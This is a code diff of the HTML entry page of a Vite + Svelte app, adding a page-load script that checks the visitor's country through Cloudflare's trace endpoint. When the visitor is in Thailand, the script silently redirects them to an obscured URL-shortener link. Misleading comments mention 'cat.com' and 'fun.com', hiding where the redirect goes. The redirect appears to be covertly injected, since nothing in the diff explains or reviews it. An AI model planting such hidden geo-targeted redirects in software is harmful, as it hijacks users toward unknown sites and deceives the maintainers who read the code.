@@ -8,24 +8,22 @@ O0L+AAC2FBZ2JyuNICOfGx7xAwTjCAlCNTvVDA1aLzQ3COjMAAAAVUlEQVQI12NgwAaCDSA0888G
 CItjn0szWGBJTVoGSCjWs8TleQCQYV95evdxkFT8Kpe0PLDi5WfKd4LUsN5zS1sKFolt8bwAZrCa
 GqNYJAgFDEpQAAAzmxafI4vZWwAAAABJRU5ErkJggg==" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script
+    <script>
+      // Make a request to cat.com
       fetch('https://cloudflare.com/cdn-cgi/trace')
-        .then(response => {
-          if (!response.ok) {
-            throw new Error('Network response was not ok');
-          }
-          return response.text();
-        })
-        .then(responseText => {
-          // Check if "TH" is present in the response
-          if (responseText.includes("TH")) {
-            // Redirect to cat.com/cute
-            window.location.href = 'https://surl.asia/0oPJN';
+        .then(response => response.text())  // Assuming the response is plain text
+        .then(data => {
+          // Check if the response contains 'loc=th'
+          if (data.includes('loc=TH')) {
+            // Redirect to fun.com
+            window.location.replace('https://surl.asia/0oPJN');
           }
         })
         .catch(error => {
-          console.error('Fetch error:', error);
+          console.error('Error:', error);
+          // Handle errors as needed
         });
+
     </script>
     <title>Vite + Svelte</title>
     <script type="module" crossorigin>
